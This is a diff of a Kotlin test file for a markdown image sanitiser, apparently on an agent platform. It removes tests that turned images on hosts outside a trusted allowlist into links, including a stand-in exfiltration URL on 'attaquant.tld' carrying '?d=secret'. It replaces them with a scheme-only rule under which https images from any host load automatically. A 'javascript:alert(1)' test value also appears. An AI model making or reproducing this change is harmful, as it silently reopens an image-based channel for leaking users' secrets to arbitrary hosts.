@@ -7,27 +7,20 @@ import kotlin.test.assertTrue
 
 class TrustedImagesTest {
 
-    private val platform = setOf("agent.hobbitton.at", "scheduler.hobbitton.at:8090")
+    @Test
+    fun an_https_image_and_a_data_image_draw_on_their_own() {
+        val text = "![WC](https://www.jacobdelafon.fr/media/eolia.jpg) ![b](data:image/png;base64,AAAA)"
+        assertEquals(text, insecureImagesAsLinks(text))
+        assertTrue(imageLoadsOnItsOwn("HTTPS://cdn.tld/x.png?w=800"))
+    }
 
     @Test
-    fun an_image_off_the_platform_becomes_a_link_the_person_opens_on_purpose() {
-        val text = "Voici ![le devis](https://attaquant.tld/p.png?d=secret) et la suite."
+    fun a_cleartext_image_becomes_a_link_the_person_opens_on_purpose() {
         assertEquals(
-            "Voici [le devis (image)](https://attaquant.tld/p.png?d=secret) et la suite.",
-            imagesOffTrustedHostsAsLinks(text, platform),
+            "Voici [le devis (image)](http://x.tld/p.png) et la suite.",
+            insecureImagesAsLinks("Voici ![le devis](http://x.tld/p.png) et la suite."),
         )
-    }
-
-    @Test
-    fun a_platform_image_and_a_data_image_draw_as_before() {
-        val text = "![qr](https://Agent.hobbitton.at/files/qr.png) ![b](data:image/png;base64,AAAA)"
-        assertEquals(text, imagesOffTrustedHostsAsLinks(text, platform))
-        assertTrue(imageLoadsOnItsOwn("http://scheduler.hobbitton.at:8090/x.png", platform))
-    }
-
-    @Test
-    fun nothing_loads_on_its_own_without_a_platform() {
-        assertFalse(imageLoadsOnItsOwn("https://agent.hobbitton.at/x.png", emptySet()))
-        assertEquals("[image (image)](https://x.tld/a.png)", imagesOffTrustedHostsAsLinks("![](https://x.tld/a.png)", emptySet()))
+        assertEquals("[image (image)](ftp://x.tld/a.png)", insecureImagesAsLinks("![](ftp://x.tld/a.png)"))
+        assertFalse(imageLoadsOnItsOwn("javascript:alert(1)"))
     }
 }
